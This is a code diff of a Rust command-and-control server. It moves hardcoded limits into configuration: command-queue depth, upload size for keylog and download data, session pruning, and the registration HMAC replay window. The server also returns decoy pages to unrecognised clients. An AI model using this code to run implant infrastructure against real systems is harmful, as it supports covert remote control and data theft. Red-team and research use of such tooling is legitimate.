@@ -30,6 +30,7 @@ use chrono::Utc;
 use tracing::{info, warn, error};
 
 use crate::common::{ClientHello, SecuredCommand, CommandResponse, Session, SharedSessions};
+use crate::config::config;
 use crate::database::{self, DbPool};
 use crate::api::SharedResults;
 
@@ -63,8 +64,6 @@ pub struct HttpC2State {
 }
 
 impl HttpC2State {
-    const MAX_POISON_RECOVERIES: u32 = 3;
-
     pub fn new(sessions: SharedSessions, db: DbPool, results: SharedResults) -> Self {
         let start_id = if let Ok(conn) = db.get() {
             database::allocate_session_id(&conn).unwrap_or(1000)
@@ -86,7 +85,8 @@ impl HttpC2State {
 
     /// Check if the state has been poisoned too many times.
     pub fn is_degraded(&self) -> bool {
-        self.poison_count.load(std::sync::atomic::Ordering::Relaxed) >= Self::MAX_POISON_RECOVERIES
+        self.poison_count.load(std::sync::atomic::Ordering::Relaxed)
+            >= config().server.max_poison_recoveries
     }
 
     fn alloc_id(&self) -> u32 {
@@ -126,8 +126,7 @@ impl HttpC2State {
             // Backpressure: if an agent is offline or polling very infrequently,
             // commands pile up in memory indefinitely. Cap the queue depth to
             // prevent OOM from operators mass-queueing commands to dead sessions.
-            const MAX_QUEUED_COMMANDS: usize = 256;
-            if queue.len() >= MAX_QUEUED_COMMANDS {
+            if queue.len() >= config().server.max_queued_commands {
                 tracing::warn!(session_id, "Command queue full ({} pending), dropping oldest", queue.len());
                 queue.pop_front();
             }
@@ -203,8 +202,8 @@ pub async fn start(
         .fallback(any(handle_c2_or_decoy))
         // C2 POST bodies can be large (chunked downloads ~2.8 MB, keylog
         // dumps); axum's 2 MiB DefaultBodyLimit would 413 them. Mirror the
-        // API router's 50 MB cap (src/api/mod.rs).
-        .layer(axum::extract::DefaultBodyLimit::max(50 * 1024 * 1024))
+        // API router's cap (src/api/mod.rs); both read the same config key.
+        .layer(axum::extract::DefaultBodyLimit::max(config().server.http_body_limit_bytes))
         .with_state(state.clone());
 
     let addr = SocketAddr::from(([0, 0, 0, 0], port));
@@ -215,11 +214,12 @@ pub async fn start(
     // indefinitely, eventually causing OOM on the C2 server.
     let cleanup_state = state.clone();
     tokio::spawn(async move {
-        let mut interval = tokio::time::interval(std::time::Duration::from_secs(300));
+        let mut interval = tokio::time::interval(std::time::Duration::from_secs(
+            config().server.http_prune_interval_secs,
+        ));
         loop {
             interval.tick().await;
-            // Prune sessions idle for over 1 hour
-            cleanup_state.prune_stale_sessions(3600);
+            cleanup_state.prune_stale_sessions(config().server.http_prune_idle_secs);
         }
     });
 
@@ -274,7 +274,8 @@ async fn handle_register(
                     }
                     if let Ok(ts) = chrono::DateTime::parse_from_rfc3339(&hello.reg_timestamp) {
                         let age = (Utc::now() - ts.with_timezone(&Utc)).num_seconds().abs();
-                        if age > 300 { // 5-minute window for clock skew
+                        // Freshness window covers clock skew both ways.
+                        if age > config().server.registration_hmac_window_secs {
                             warn!("Stale registration timestamp ({age}s old) from {} for build {}", addr.ip(), hello.build_id);
                             return decoy_page().into_response();
                         }
@@ -320,10 +321,10 @@ async fn handle_register(
                         // the cache with garbage HMACs, triggering the overflow cap and
                         // locking out ALL legitimate agents globally.
                         let now_replay = Utc::now();
-                        const PRUNE_THRESHOLD: usize = 1000;
+                        let prune_threshold = config().server.seen_hmac_prune_threshold;
                         {
                             let mut inner = state.inner.lock().unwrap_or_else(|e| e.into_inner());
-                            if inner.seen_hmacs.len() > PRUNE_THRESHOLD {
+                            if inner.seen_hmacs.len() > prune_threshold {
                                 inner.seen_hmacs.retain(|_, exp| *exp > now_replay);
                             }
 
@@ -331,9 +332,13 @@ async fn handle_register(
                                 warn!("Replayed auth_hmac from {} for build {}", addr.ip(), hello.build_id);
                                 return decoy_page().into_response();
                             }
+                            // Expire entries just past the HMAC freshness
+                            // window so replays inside it stay rejected.
                             inner.seen_hmacs.insert(
                                 hello.auth_hmac.clone(),
-                                now_replay + chrono::Duration::seconds(310),
+                                now_replay + chrono::Duration::seconds(
+                                    config().server.registration_hmac_window_secs + 10,
+                                ),
                             );
                         }
                     }
